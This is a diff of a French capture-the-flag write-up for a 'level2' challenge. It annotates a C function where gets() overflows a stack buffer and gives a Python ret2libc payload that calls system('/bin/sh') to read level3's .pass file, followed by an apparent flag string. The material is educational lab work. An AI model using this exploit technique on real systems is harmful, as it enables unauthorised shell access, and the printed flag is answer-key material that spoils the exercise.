@@ -31,11 +31,11 @@ void p()
 {
     fflush(stdout);
 
-    int buffer[16];
-    gets(buffer);
+    int buffer[16]; // <------------------------1 buffer declared with 64 (16 * 4 per int) bytes
+    gets(buffer); // <--------------------------2 overflow possible due to no size check, no shell call in code so Ret2Libc exploit
 
-    int check = buffer[20];
-    if ((check & 0xb0000000) == 0xb0000000)
+    int check = buffer[20]; // <----------------3 code checks that first address post overflow doesnt start with 0xb bit
+    if ((check & 0xb0000000) == 0xb0000000) // <4 here
     {
         printf("(%p)\n", check);
         exit(1);
@@ -48,7 +48,8 @@ void p()
 int main()
 {
     p();
-}
+    return 0; // <------------------------------5 return address changed to point to the ret instruction of p() because system() starts with 0xb
+} // <------------------------------------------6 ret instruction p() will look for an address to return to, find system(), and we get shell access
 ```
 
 J'identifie :
@@ -192,12 +193,7 @@ $ (python -c 'print("\x90" * 80 + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[
 Je construis mon payload en utilisant python, y ajoute une lecture du `.pass` du level3, et enfin le passe à l'executable `level2` :
 
 ```python
-(python -c 'print("\x90"*80
-+ "\x08\x04\x85\x3e"[::-1] # <- return address of p [::-1] is an inverted splice
-+ "\xb7\xe6\xb0\x60"[::-1] # <- return address of exit
-+ "\x08\x04\x83\xd0"[::-1] # <- return address of system
-+ "\xb7\xf8\xcc\x58"[::-1] # <- return address of "bin/sh"
-)' && echo 'cat /home/user/level3/.pass') | ./level2
+(python -c 'print("\x90" * 80 + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "\x08\x04\x83\xd0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])' && echo 'cat /home/user/level3/.pass') | ./level2
 
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
